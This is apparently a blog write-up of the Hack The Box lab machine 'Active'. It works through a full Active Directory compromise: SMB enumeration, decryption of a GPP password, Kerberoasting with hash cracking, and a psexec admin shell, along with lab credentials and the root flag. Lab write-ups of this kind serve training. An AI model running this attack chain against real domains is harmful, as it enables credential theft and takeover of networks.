---
layout: post
title: HTB Machine - Active
subtitle: 
cover-img: /assets/img/Scifi.1920x1080.jpg
thumbnail-img: /assets/img/Scifi.1920x1080.jpg
share-img: /assets/img/Scifi.1920x1080.jpg
tags: [ HTB, Active Directory, Hack the Box]
---

# Scanning the target we identify that is a Domain controller. Then we proceed to enumerate the shares with smbclient, we do this with a null session since we dont have credentials (flag -N)

smbclient -L 10.10.10.100 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      

# we dont know to which folders we have permissions to. We can see permissions using smbmap with -H flag. Note: we placed the IP inside the etc/hosts file with the name active.htb.

smbmap -H active.htb                                  
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	

# We keep diggin into the directory this time using the flag -r (folderpath). We get to a point where we see folders that usually are part of the Sysvol directory (which we dont have access too), but this could be perhaps a copy?

smbmap  -H active.htb -r Replication/active.htb                                         
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replicationactive.htb\*
	dr--r--r--                0 Sat Jul 21 12:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 12:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 12:37:44 2018	DfsrPrivate
	dr--r--r--                0 Sat Jul 21 12:37:44 2018	Policies
	dr--r--r--                0 Sat Jul 21 12:37:44 2018	scripts

# We continue enumerating the folders. In one of them there is a Groups.xml file that is very interesting. We donwload it to our attack machine. 

smbmap  -H active.htb --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml

# there is a password that is not in clear text. But Microsoft at some point gave away the AES key to encrypt such passwords. There is a ruby utility called gpp-decrypt that uses that key to decrypt the password. We could try it in our hash. 

gpp-decrypt 'hash_value'

# then we got our clear text pass: GPPstillStandingStrong2k18 for the user we find in the XML file too SVC_TGS. We can corroborate this with crackmapexec, if it places a + the user and pass are valid. Then we could list the --shares this user could access. 

❯ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p GPPstillStandingStrong2k18 --shares
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [+] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ            


# again we use smbmap to enumerate the Users folders and go for the user flag in the usual spot. 

smbmap -H active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users/SVC_TGS/Desktop
smbmap -H active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --download Users/SVC_TGS/Desktop/user.txt

# we can try to list all users in the directory but we need valid credentials for that, so we use the ones we found to list the users, groups and descriptions.

rpcclient -U "" 10.10.10.100 -N -c 'enumdomusers'
Error was NT_STATUS_ACCESS_DENIED

rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c 'enumdomusers'
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[SVC_TGS] rid:[0x44f]

rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c 'enumdomgroups'
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[DnsUpdateProxy] rid:[0x44e]

rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c 'querygroupmem 0x200'
	rid:[0x1f4] attr:[0x7]
	
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c 'queryuser 0x1f4'
	User Name   :	Administrator
	Full Name   :
	.
	.(redacted)

rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c 'querydispinfo'
index: 0xdea RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xe19 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xeb2 RID: 0x44f acb: 0x00000210 Account: SVC_TGS	Name: SVC_TGS	Desc: (null)

# we can use the rpcenum tool from S4vitar. We need to change the parameters (find replace) the -U to place the credentials and delete the -N. We give execution permissions to the script and run it with the flags we want to check. Basically if we dont want to remember all the commands above it will do the same thing.

sudo ./rpcenum -e DGroups -i active.htb

# ASREPRoast attack: if we didnt have a password we could try to get hashes by requesting a TGT. Basically it is an attack against Kerberos that allows password hashes to be retrieved for users and do not require pre-authentication. If the user has “Do not use Kerberos pre-authentication” enabled, then an attacker can recover a Kerberos AS-REP encrypted with the users RC4-HMAC’d password and he can attempt to crack this ticket offline. So we list our users and place them inside a txt file to use the GetNPUsers tool.

GetNPUsers.py -no-pass -usersfile users.txt active.htb/
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User SVC_TGS doesn't have UF_DONT_REQUIRE_PREAUTH set

# no luck with this. If we need to brute force users in the DC we could use kerbrute. WE have to synchronize the clock with the DC, we do this with "ntpdate 10.10.10.100" that way our machine takes the time from the DC. Being out of sync can cause some issues. i

./kerbrute_linux_amd64 userenum --dc 10.10.10.100 -d active.htb /usr/share/seclists/Usernames/Names/names.txt

# Then we query target domain for SPNs that are running under a user account. We will neet to check if we can get a TGS for the user. if the user has CIFS.

GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2023-04-27 15:24:30.307759 

# the user is admin so we could send a request and get a hash that we will try to crack offline

   

❯ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2023-04-27 15:24:30.307759             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5fe8f4270ad1567f0459ff6126e6a02f$9c05cff6a9b4533e77ded9d5632ef98a1940675102e43d8839f0add2c5d2f068b872f2bec193be6d569c240dfe01c82ec9690ba698e7f3796c316ad2248c592c384e809080..(REDACTED)

#we place in a file hash and crack with john

john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:05 DONE (2023-04-28 07:48) 0.1677g/s 1768Kp/s 1768Kc/s 1768KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

# Validate credentials: 
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)

# then we can login
psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe   

#and search for the flag

type C:\Users\Administrator\Desktop\root.txt
b4589229e8c0992e58226301bf9f68d3

